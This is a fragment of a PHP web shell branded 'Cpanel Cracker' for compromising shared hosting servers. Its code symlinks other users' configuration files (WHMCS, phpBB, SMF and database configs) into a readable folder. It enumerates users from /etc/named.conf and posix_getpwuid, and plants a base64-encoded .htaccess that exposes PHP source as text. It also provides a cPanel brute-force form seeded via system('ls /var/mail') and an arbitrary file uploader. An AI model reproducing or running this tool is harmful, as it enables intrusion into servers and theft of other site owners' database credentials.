symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
}

$d0mains = @file("/etc/named.conf");

if($d0mains)
{
mkdir($fn);
chdir($fn);

foreach($d0mains as $d0main)
{
if(eregi("zone",$d0main))
{
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();

if(strlen(trim($domains[1][0])) > 2)
{
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

syml($user['name'],$domains[1][0]);
}
}
}
echo "<center><font color=lime size=3>[ Done ]</font></center>";
echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#040099>| Go Here |</font></a></center>";
}
else
{
mkdir($fn);
chdir($fn);
$temp = "";
$val1 = 0;
$val2 = 1000;
for(;$val1 <= $val2;$val1++)
{
$uid = @posix_getpwuid($val1);
if ($uid)
$temp .= join(':',$uid)."\n";
}
echo '<br/>';
$temp = trim($temp);

$file5 = fopen("test.txt","w");
fputs($file5,$temp);
fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));

$file = fopen("test.txt", "r") or exit("Unable to open file!");
while(!feof($file))
{
$s = fgets($file);
$matches = array();
$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
$matches = str_replace("home/","",$matches[1]);
if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
continue;
syml($matches,$matches);
}
fclose($file);
echo "</table>";
unlink("test.txt");
echo "<center><font color=lime size=3>[ Done ]</font></center>";
echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#040099>| Go Here |</font></a></center>";
}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."><< BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
<strong>
<input name="page" type="hidden" value="find"><table>
</strong><br><br><center><font size="3" align="center" style="italic" color="#9f030e">+--=[ Cpanel BruteForce ]=--+</font></center><br>
<table width="600" border="0" class="tabnet" cellpadding="3" cellspacing="1" align="center">
<tr>
<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
<center><b><font size="3" style="italic" color="#9f030e">[ Cpanel Brute Force ]</font></b></center></td></tr>
<tr>
<td>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
<strong>Username List :</strong></td>
<td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
<strong>Password List :</strong></td>
<td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
<strong>Type :</strong></td>
<td valign="top" bgcolor="#151515" colspan="5">
<span class="style2"><strong>Simple : </strong> </span>
<strong>
<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
<font class="style2"><strong>/etc/passwd : </strong> </font>
<strong>
<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
</strong>
</span>
</td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"></td>
<td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="Start">
</strong>
</td>
<tr>
</form>
<tr>
<td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Get Config ]</strong></center></td>
</tr>
<form method="POST" target="_blank">
<strong>
<input name="mendapatkan" type="hidden" value="passwd">
</strong>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
<td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="50" name="foldername" type="text"></strong></td>
</strong>
</td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"></td>
<td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
</strong>
</td>
<tr>
</form>
<tr>
<td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Get Wordlist ]</strong></center></td>
</tr>
<form method="POST" target="_blank">
<strong>
<input name="pass" type="hidden" value="password">
</strong>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
<td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="50" name="url" type="text" value="http://www."></strong></td>
</strong>
</td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"></td>
<td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
</strong>
</td>
<tr>
</form>
<tr>
<td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Info
Security ]</strong></center></td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
<td valign="top" bgcolor="#151515" colspan="5">
<strong>
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>
</strong>
</td>
</tr>
<tr>
<td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
<td valign="top" bgcolor="#151515" colspan="5">
<strong>
<form method="POST" target="_blank">
<strong>
<input name="matikan" type="hidden" value="sekatan">
</strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#9f030e>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=green>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
</strong>
</td></tr>';
}
?></strong></td></tr></table></table></table>
<?
break;

#########################bds

case '':

?><?php

break;


// Uploader
case 'uploader':

echo '<center><b>+--=[ Uploader ]=--+</b><br><br><br><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<p align="center"><font face="Verdana"

size="1"><font color="white"> Done !!</font><br>'; }
else { echo '<font color="#FF0000">Failed :( </font></p>
</td></table></tr>

'; }
}
break;

}}
?><br><br><br><center><form action='' method='post'>
<table class='tabnet' style='width:650px;' border=''>
<th colspan=10>Security Info</th><tr>
<td>System </td>
<td><?php
echo php_uname();?></td>
</tr>
<tr>
<td valign="top" bgcolor="" style="width: 139px">Safe Mode</td>
<td valign="top" bgcolor="" colspan="5">
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>
</td>
</tr>
<tr>
<td valign="top" bgcolor="" style="width: 139px">Desible Function</td>
<td valign="top" bgcolor="" colspan="5">

<form method="POST" target="_blank">

<input name="matikan" type="hidden" value="sekatan">


<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#9f030e>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=green>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
</td></tr>';
}
?><tr>

</table></form></center>
<center><br><br><b><div class="info">Cpanel Cracker ReDesign By <span class="gaya"><a href="http://twitter.com/billgate">BillGate</a></span> </div>
<div class="jaya"></div></center></b><br><br>

</body></html>